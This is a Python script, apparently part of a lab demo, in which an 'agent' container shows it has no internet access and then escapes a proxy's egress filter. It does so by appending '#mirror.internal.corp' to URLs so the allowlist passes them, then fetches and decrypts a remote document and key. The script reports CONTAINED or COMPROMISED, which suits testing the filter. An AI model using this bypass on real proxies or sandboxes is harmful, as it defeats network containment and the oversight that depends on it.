"""
Agent container -- the system that wants the data.

This container has NO internet. It is attached to the internal network only.
Its one path out is HTTP to the proxy. The agent proves its own isolation
first, then escapes the proxy's egress filter to fetch the document and the
key from the real internet, and finally decrypts.

Environment:
  PROXY            e.g. http://proxy:8080
  DOC_URL          public URL of the document (ciphertext)
  KEY_URL          public URL of the key
  EXPECTED_SHA256  sha256 of the original message, for self-check
  KEY_STATE        public | private | missing  (for the report line)
"""

import hashlib
import json
import os
import socket
import subprocess
import sys
import urllib.error
import urllib.parse
import urllib.request

import crypto_demo

OUTSIDE_IP = "1.1.1.1"  # a public IP, pinged to prove isolation

INTERNAL_MIRROR = "mirror.internal.corp"
PROXY = os.environ["PROXY"]
DOC_URL = os.environ["DOC_URL"]
KEY_URL = os.environ["KEY_URL"]
EXPECTED_SHA256 = os.environ.get("EXPECTED_SHA256", "")
KEY_STATE = os.environ.get("KEY_STATE", "public")


def bypass(url: str) -> str:
    sep = "&" if "#" in url else "#"
    return f"{url}{sep}{INTERNAL_MIRROR}"


def _sh(cmd, timeout=10):
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return p.returncode, (p.stdout + p.stderr).strip()
    except FileNotFoundError:
        return 127, f"{cmd[0]}: not found"
    except subprocess.TimeoutExpired:
        return 124, "timed out"


def _tcp_open(host: str, port: int, timeout: float = 3.0) -> bool:
    try:
        socket.create_connection((host, port), timeout=timeout).close()
        return True
    except OSError:
        return False


def prove_isolation() -> None:
    """Run real network tests to PROVE this container has no internet."""
    # 1) routing table -- no usable route to the outside
    rc, out = _sh(["ip", "-4", "route"])
    print("  $ ip route", flush=True)
    for ln in out.splitlines():
        print("      " + ln, flush=True)

    # 2) ping a public IP -- must fail
    print(f"  $ ping -c 2 -W 2 {OUTSIDE_IP}", flush=True)
    rc, out = _sh(["ping", "-c", "2", "-W", "2", OUTSIDE_IP], timeout=12)
    for ln in out.splitlines():
        print("      " + ln, flush=True)
    if rc == 0:
        print(f"  [!] ping to {OUTSIDE_IP} SUCCEEDED -- isolation is broken", flush=True)
    else:
        print(f"  [ok] ping to {OUTSIDE_IP} FAILED -- the agent has no internet", flush=True)

    # 3) raw TCP to a public IP -- must fail
    if _tcp_open(OUTSIDE_IP, 443):
        print(f"  [!] TCP {OUTSIDE_IP}:443 OPEN -- isolation is broken", flush=True)
    else:
        print(f"  [ok] TCP {OUTSIDE_IP}:443 unreachable -- no route to the internet", flush=True)

    # 4) the proxy, on the internal network -- must succeed
    try:
        with urllib.request.urlopen(PROXY + "/healthz", timeout=4) as r:
            r.read()
        print("  [ok] agent CAN reach the proxy on the internal network", flush=True)
    except Exception as e:  # noqa: BLE001
        print(f"  [!] agent cannot reach the proxy: {e}", flush=True)


def via_proxy(url: str, label: str):
    """Ask the proxy to fetch url. Returns (status, body_bytes)."""
    q = PROXY + "/fetch?url=" + urllib.parse.quote(bypass(url), safe="")
    print(f"  [agent] ask proxy for {label}: {bypass(url)}", flush=True)
    try:
        with urllib.request.urlopen(q, timeout=25) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


def main() -> int:
    print("=" * 64, flush=True)
    print(" AGENT container -- no internet of its own", flush=True)
    print("=" * 64, flush=True)

    print("\n[STEP 0] PROOF -- this container has NO internet", flush=True)
    prove_isolation()

    print("\n[STEP 1] Escape and fetch the DOCUMENT via the proxy", flush=True)
    status, body = via_proxy(DOC_URL, "document")
    if status == 403:
        print("  [blocked] proxy refused (mitigated egress filter).", flush=True)
        print("\nRESULT: CONTAINED", flush=True)
        return 10
    if status != 200:
        print(f"  [fail] document unavailable (status {status}).", flush=True)
        print("\nRESULT: FAILED", flush=True)
        return 20
    print("  [+] document retrieved", flush=True)

    print("\n[STEP 2] Escape and fetch the KEY via the proxy", flush=True)
    status, key_body = via_proxy(KEY_URL, "key")
    if status == 403:
        print("  [blocked] proxy refused (mitigated egress filter).", flush=True)
        print("\nRESULT: CONTAINED", flush=True)
        return 10
    if status != 200:
        print(f"  [fail] key unavailable (status {status}); key state = {KEY_STATE}.", flush=True)
        print("  The agent escaped, but without the key it cannot decrypt.", flush=True)
        print("\nRESULT: FAILED (key is " + KEY_STATE + ")", flush=True)
        return 20
    print("  [+] key retrieved", flush=True)

    print("\n[STEP 3] Combine and decrypt", flush=True)
    payload = json.loads(body.decode("utf-8"))
    key = crypto_demo.key_from_text(key_body.decode("utf-8").strip())
    message = crypto_demo.decrypt(key, payload["token"])

    print("\nRESULT: COMPROMISED -- recovered message:", flush=True)
    for line in message.splitlines():
        print("    " + line, flush=True)

    if EXPECTED_SHA256:
        got = hashlib.sha256(message.encode()).hexdigest()
        ok = got == EXPECTED_SHA256
        print(f"\n  self-check sha256: {'MATCH' if ok else 'MISMATCH'}", flush=True)
        return 0 if ok else 30
    return 0


if __name__ == "__main__":
    sys.exit(main())
